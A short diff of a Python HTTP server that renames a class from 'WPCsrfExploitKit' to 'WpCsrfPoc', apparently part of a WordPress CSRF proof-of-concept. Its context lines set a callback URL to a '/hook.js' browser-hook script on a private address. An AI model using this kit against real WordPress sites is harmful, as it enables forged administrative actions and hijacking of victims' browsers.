@@ -14,7 +14,7 @@ thisUrl = "http://localhost:8081"
 callbackUrl = "http://192.168.80.137:3000/hook.js"
 
 
-class WPCsrfExploitKit(BaseHTTPRequestHandler):
+class WpCsrfPoc(BaseHTTPRequestHandler):
 
     def do_GET(self):
 
@@ -70,7 +70,7 @@ class WPCsrfExploitKit(BaseHTTPRequestHandler):
 
     @staticmethod
     def serve_forever(port):
-        HTTPServer(('', port), WPCsrfExploitKit).serve_forever()
+        HTTPServer(('', port), WpCsrfPoc).serve_forever()
 
 
-WPCsrfExploitKit.serve_forever(8081)
+WpCsrfPoc.serve_forever(8081)
